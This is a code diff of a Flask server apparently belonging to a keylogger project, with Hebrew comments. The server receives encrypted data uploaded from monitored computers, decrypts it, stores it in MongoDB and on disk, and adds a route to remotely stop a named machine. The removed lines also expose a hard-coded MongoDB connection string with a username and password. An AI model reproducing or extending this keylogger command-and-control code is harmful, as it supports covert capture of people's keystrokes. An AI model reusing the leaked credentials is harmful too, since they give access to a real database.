@@ -7,13 +7,14 @@ import os
 import time
 import json
 
+
 app = Flask(__name__)
 CORS(app)
 
 class Users:
 
-    def __init__(self):
-        self.CONNECTION_STRING = "mongodb+srv://Oryan3160204:Oryan3160204@keyloggerproject.gplgc.mongodb.net/"
+    def __init__(self,mongo_link):
+        self.CONNECTION_STRING = mongo_link
         self.client = MongoClient(self.CONNECTION_STRING)
         self.DB = self.client["KeyLoggerProject"]
         self.collection = self.DB["UsersDatabase"]
@@ -32,6 +33,7 @@ class App:
         self.DB = self.client["KeyLoggerProject"]
         self.collection = self.DB["computers"]
         self.computer_connection = {}
+        self.computer_to_stop = []
         # self.path = "..\\server\\backend\\data"
         self.path = os.path.join("..","server","backend","data")
 
@@ -88,7 +90,6 @@ class App:
             #החזרת תשובה האם הצליח או לא
             return True
         except Exception as e:
-            print(e)
             return False
 
 
@@ -102,27 +103,22 @@ def home():
 @app.route("/api/upload",methods=["POST"])
 def upload():
 
-    # קבלת הנתונים שהמחשב שלך
-    data = request.get_json()
+    try:
+        data = request.get_json() # קבלת הנתונים שהמחשב שלך
 
-    # ניהול שגיאות
-    if error_manager(data):
-        return jsonify({"message": data})
+        if error_manager(data):  # ניהול שגיאות
+            return jsonify({"message": "error"})
 
-    # יצירת אוביקט של הצפנה
-    decryptor = Encryptor()
+        data = decryptor.decrypt(data) # להחזיר את ההצפנה למתונים המקוריים
 
-    # להחזיר את ההצפנה למתונים המקוריים
-    data = decryptor.xor(data)
+        manager.add_computer(data)  # הוספת המחשב לDB
 
-    # הוספת המחשב לDB
-    manager.add_computer(data)
+        manager.save_in_json(data) #הוספת הנתונים לזיכרון בתור json
 
-    #הוספת הנתונים לזיכרון בתור json
-    print(manager.save_in_json(data))
-
-    # החזרת תשובה
-    return jsonify({"message": "continue"})
+        return jsonify({"message": "stop" if data["mac_name"] in manager.computer_to_stop else "continue"}) #כיבוי המחשב אם נשלחה בקשת כיבוי
+    except Exception as e:
+        print(e)
+        return jsonify({"message" : "error"})
 
 def error_manager(data:dict) -> bool:
     #אם לא התקבל ערך
@@ -192,11 +188,22 @@ def download_file(folder,file_path):
     #החזרת הקובץ הנדרש
     return send_from_directory(folder,file_path,as_attachment=True)
 
+@app.route("/<computer_name>/stop")
+def stop(computer_name):
+    manager.computer_to_stop.append(computer_name)
+    return "success",200
+
 
 if __name__ == '__main__':
-    mongo_link = "mongodb+srv://Oryan3160204:Oryan3160204@keyloggerproject.gplgc.mongodb.net/"
-    users = Users()
+    #קבלת הקישור לחיבור לmongoDB
+    with open("../config.json",'r') as file:
+        data = json.load(file)
+        mongo_link = data["mongo_link"]
+        key = data["key"]
+
+    users = Users(mongo_link)
     manager = App(mongo_link)
+    decryptor = Encryptor(key)# יצירת אוביקט של הצפנה
     process = SpecialKeys()
     app.run(debug=True)
 
